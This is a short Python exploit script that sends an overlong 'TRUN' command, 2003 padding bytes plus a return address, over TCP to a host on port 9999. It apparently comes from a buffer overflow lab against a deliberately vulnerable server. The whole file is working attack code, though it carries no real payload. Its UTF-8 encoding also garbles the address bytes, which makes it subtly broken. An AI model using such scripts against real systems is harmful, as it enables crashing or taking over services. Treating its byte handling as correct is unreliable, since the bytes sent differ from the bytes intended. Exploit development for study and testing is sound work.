#!/usr/bin/python
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.0.2.4', 9999))
to_send = 'TRUN /.:/' + shellcode
s.send((bytearray(to_send, 'utf-8')))
s.close()
